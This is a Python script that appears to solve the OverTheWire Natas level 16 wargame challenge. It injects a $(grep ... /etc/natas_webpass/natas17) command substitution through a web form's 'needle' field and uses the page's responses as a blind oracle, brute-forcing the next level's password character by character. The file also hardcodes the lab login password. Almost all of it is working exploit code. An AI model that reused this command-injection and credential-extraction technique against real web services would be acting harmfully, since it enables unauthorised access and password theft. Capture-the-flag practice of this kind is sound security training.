import requests
import string

url = 'http://natas16.natas.labs.overthewire.org/'
uName = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'


charset = "".join([string.ascii_letters,string.digits])

#filtering out unused chars increases speed
#Filtered set can have less than 32 chars but never more than 32.
#Chose a while loop to future proof script for a worst case : 32 distinct chars in filtered Set
#Need to limit i  because  of worst case :  password repeats the same char 32 time. Need to stop at end of charset.

filteredSet= ""
i =  0

while(not(len(filteredSet) >= 32) and i < len(charset)):
    needle = {"needle":"$(grep {} /etc/natas_webpass/natas17)quiz".format(charset[i])}
    response = requests.post(url,data=needle,auth=(uName,password))

    if not("quiz" in response.text):
        filteredSet += charset[i]
    i += 1

print(filteredSet)
currentIndex = 0
currentLetter = filteredSet[currentIndex]
currentPassword = ""
#Begin bruteforcing with filtered list.
#Remove 1st while loop if cannot determine charset used in the password

while (not(len(currentPassword) >= 32)):
    needle = {"needle":"$(grep ^{} /etc/natas_webpass/natas17)quiz".format(currentLetter)}
    response = requests.post(url,data=needle,auth=(uName,password))
    if not("quiz" in response.text):
        currentPassword += currentLetter[-1:]
        print(currentPassword)
        currentIndex = 0
    else:
        currentIndex +=1
    currentLetter = currentPassword+filteredSet[currentIndex]
    print("CI = ",currentIndex,"CL = ",currentLetter ,"CP = ", currentPassword)
print("-----------------------------------------------------------------------------")
